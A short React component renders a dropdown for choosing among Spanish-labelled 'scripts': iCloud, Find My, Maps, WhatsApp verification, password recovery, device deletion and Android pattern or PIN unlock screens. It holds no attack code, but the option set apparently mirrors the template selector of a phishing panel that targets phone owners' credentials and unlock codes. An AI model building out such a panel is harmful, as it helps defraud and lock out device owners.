const SelectScript = ({
    script,
    setScript
}) => {
    return (
        <select className="h-11 w-full appearance-none rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 pr-11 text-sm text-gray-800 placeholder:text-gray-400 outline-none transition-all focus:border-blue-500 focus:ring-2 focus:ring-blue-500/10"

            value={script}
            onChange={(e) => setScript(e.target.value)}
        >
            <option value="ic" className="text-gray-700">
                iCloud
            </option>
            <option value="icFind" className="text-gray-700">
                iCloud Find My
            </option>
            <option value="maps" className="text-gray-700">
                Mapas
            </option>
            <option value="mapsZoom" className="text-gray-700">
                Mapas Zoom
            </option>
            <option value="wappVerify" className="text-gray-700">
                Verificación de Whatsapp
            </option>
            <option value="recoverPassword" className="text-gray-700">
                Recuperar contraseña
            </option><option value="deleteDevice" className="text-gray-700">
                Borrar dispositivo
            </option><option value="androidAppPattern" className="text-gray-700">
                Android patron
            </option>
            <option value="androidAppNumeric" className="text-gray-700">
                Android númerico
            </option>
            <option value="androidAppAlphanumeric" className="text-gray-700">
                Android alfanumérico
            </option>
        </select>
    )
}

export default SelectScript;